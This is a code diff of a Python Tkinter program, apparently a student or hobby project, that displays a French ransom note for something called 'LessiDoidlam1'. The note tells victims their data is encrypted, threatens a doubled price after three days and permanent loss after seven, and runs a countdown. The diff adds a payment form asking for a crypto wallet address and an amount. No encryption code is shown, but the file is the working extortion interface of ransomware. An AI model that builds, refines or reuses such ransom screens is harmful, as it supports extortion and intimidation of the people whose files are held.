@@ -1,7 +1,9 @@
 from tkinter import *
 from tkinter import ttk
 from datetime import datetime, timedelta
+from functions import *
 
+# Création de la fenêtre et logo
 root = Tk()
 logo = PhotoImage(file="./img/LessiDoidlam1.png")
 root.title("LessiDoidlam1 - Demande de rançon")
@@ -9,60 +11,20 @@ root.iconbitmap("./img/LessiDoidlam1.ico")
 root.iconphoto(True, logo)
 root.geometry("1200x600")
 root.config(bg="red")
+
 root.grid_rowconfigure(0, weight=1)
 root.grid_columnconfigure(0, weight=1)
-
-def update_counter():
-    # Recalculer la date actuelle et la date cible (7 jours à partir d'aujourd'hui)
-    current_date = datetime.now()
-    target_date = current_date + timedelta(days=7)
-    
-    # Calculer la différence entre la date cible et la date actuelle
-    remaining_time = target_date - current_date
-    
-    # Vérifier si la différence de temps est positive (sinon on arrête le compteur)
-    if remaining_time.total_seconds() > 0:
-        # Extraire les jours, heures, minutes et secondes de la différence
-        remaining_days = remaining_time.days
-        remaining_seconds = remaining_time.seconds
-        remaining_hours = remaining_seconds // 3600  # Calcul des heures
-        remaining_minutes = (remaining_seconds % 3600) // 60  # Calcul des minutes
-        remaining_seconds = remaining_seconds % 60  # Reste des secondes
-
-        # Mettre à jour le label avec le temps restant (jours, heures, minutes, secondes)
-        counter_label.config(text=f"Il reste {remaining_days} jour(s), "
-                                 f"{remaining_hours:02}:{remaining_minutes:02}:{remaining_seconds:02} avant la fin.")
-    else:
-        # Si le compte à rebours est terminé
-        counter_label.config(text="Le délai est terminé.")
-
-    # Mettre à jour le compteur toutes les 1000 ms (1 seconde)
-    root.after(1000, update_counter)
-
-def show_payment_frame():
-    formFrame.grid_forget()
-    paymentFrame.grid(row=0, column=0, padx=100, pady=100)
-
-def show_form_frame():
-    paymentFrame.grid_forget()
-    formFrame.grid(row=0, column=0, padx=100, pady=100)
-
-def submit_form():
-    # Récupérer les valeurs des champs de saisie
-    name = name_entry.get()
-    email = email_entry.get()
-    age = age_entry.get()
-    terms = terms_var.get()
-
-    # Afficher un message de confirmation avec les données saisies
-    confirmation_label.config(text=f"Nom: {name}\nEmail: {email}\nÂge: {age}\nConditions acceptées: {terms}")
 
 paymentFrame = Frame(root, bg="white", width=1000, height=600)
 paymentFrame.grid_propagate(False)
 
+formFrame = Frame(root, bg="white", width=1000, height=600)
+formFrame.grid_propagate(False)
+
 counter_label = Label(paymentFrame, text="", bg="white")
 counter_label.grid(row=10, column=0, pady=20)
-update_counter()
+target_date = datetime.now() + timedelta(days=7)
+update_counter(counter_label, root, target_date)
 
 Label(paymentFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=0)
 Label(paymentFrame, text="Vos informations personnelles ont été cryptées.\n", bg="white").grid(column=0, row=1)
@@ -71,48 +33,59 @@ Label(paymentFrame, text="Puis-je récupérer mes fichiers ?", bg="white").grid(
 Label(paymentFrame, text="Bien sûr. Nous vous garantissons que nous pouvons restaurer tous vos fichiers de manière sécurisé et simple.\n", bg="white").grid(column=0, row=4)
 Label(paymentFrame, text="Vous avez 3 jours pour valider le paiment. Passer les jours, le prix sera doublé.\nSi vous ne payez pas au bout de 7 jours, vous ne pourrez plus jamais restaurer vos fichiers.\n", bg="white").grid(column=0, row=5)
 Label(paymentFrame, text="Veuillez procéder au paiement pour récupérer vos informations.\n", bg="white").grid(column=0, row=6)
-ttk.Button(paymentFrame, text="Payer", command=show_form_frame).grid(column=0, row=7)
-# ttk.Button(paymentFrame, text="Quitter", command=root.destroy).grid(column=0, row=10)
+ttk.Button(paymentFrame, text="Payer", command=lambda: show_form_frame(paymentFrame, formFrame)).grid(row=7, column=0)
 
-
-formFrame = Frame(root, bg="white", width=1000, height=600)
-formFrame.grid_propagate(False)
-# formFrame.grid(row=0, column=0, padx=100, pady=100)
 Label(formFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=0)
-Label(formFrame, text="Remplir le formulaire\n", bg="white").grid(column=0, row=1)
 
-name_label = Label(formFrame, text="Nom:", bg="white")
+# Formulaire
+surname_label = Label(formFrame, text="Nom :", bg="white")
+surname_label.grid(row=1, column=0, sticky=W, pady=5)
+surname_entry = Entry(formFrame, width=30)
+surname_entry.grid(row=1, column=1, pady=5)
+
+name_label = Label(formFrame, text="Prénom :", bg="white")
 name_label.grid(row=2, column=0, sticky=W, pady=5)
 name_entry = Entry(formFrame, width=30)
 name_entry.grid(row=2, column=1, pady=5)
 
-
-email_label = Label(formFrame, text="Email:", bg="white")
+email_label = Label(formFrame, text="E-mail :", bg="white")
 email_label.grid(row=3, column=0, sticky=W, pady=5)
 email_entry = Entry(formFrame, width=30)
 email_entry.grid(row=3, column=1, pady=5)
 
+wallet_adress_label = Label(formFrame, text="Adresse du portefeuille :", bg="white")
+wallet_adress_label.grid(row=4, column=0, sticky=W, pady=5)
+wallet_adress_entry = Entry(formFrame, width=30)
+wallet_adress_entry.grid(row=4, column=1, pady=5)
 
-age_label = Label(formFrame, text="Âge:", bg="white")
-age_label.grid(row=4, column=0, sticky=W, pady=5)
-age_entry = Entry(formFrame, width=30)
-age_entry.grid(row=4, column=1, pady=5)
-
-
-terms_var = BooleanVar()
-terms_check = Checkbutton(formFrame, text="Accepter les conditions", bg="white", variable=terms_var)
-terms_check.grid(row=5, column=0, columnspan=2, pady=10)
-
-
-submit_button = ttk.Button(formFrame, text="Soumettre", command=submit_form)
-submit_button.grid(row=6, column=0, columnspan=2, pady=10)
+amount_label = Label(formFrame, text="Montant :", bg="white")
+amount_label.grid(row=5, column=0, sticky=W, pady=5)
+amount_entry = Entry(formFrame, width=30)
+amount_entry.grid(row=5, column=1, pady=5)
 
 
-confirmation_label = Label(formFrame, text="", font=("Arial", 10), fg="green", bg="white")
+confirmation_label = Label(formFrame, text="", fg="red", bg="white")
 confirmation_label.grid(row=7, column=0, columnspan=2, pady=10)
 
-ttk.Button(formFrame, text="Retour", command=show_payment_frame).grid(column=0, row=8)
+# Bouton Soumettre
+submit_button = ttk.Button(formFrame, text="Soumettre", command=lambda: submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label))
+submit_button.grid(row=8, column=0, columnspan=2, pady=10)
 
+# Frame de chargement (initialement cachée)
+loadingFrame = Frame(root, bg="white", width=600, height=400)
+loadingFrame.grid_propagate(False)
+loading_label = Label(loadingFrame, text="Vérification de la transaction en cours...", bg="white")
+loading_label.grid(row=0, column=0, padx=100, pady=100)
+
+# Frame de succès (initialement cachée)
+successFrame = Frame(root, bg="white", width=600, height=400)
+successFrame.grid_propagate(False)
+
+ttk.Button(formFrame, text="Retour", command=lambda: show_payment_frame(formFrame, paymentFrame)).grid(row=8, column=0)
+
+counter_label = Label(formFrame, text="", bg="white")
+counter_label.grid(row=10, column=0, pady=20)
+update_counter(counter_label, root, target_date)
 
 paymentFrame.grid(row=0, column=0, padx=100, pady=100)
 
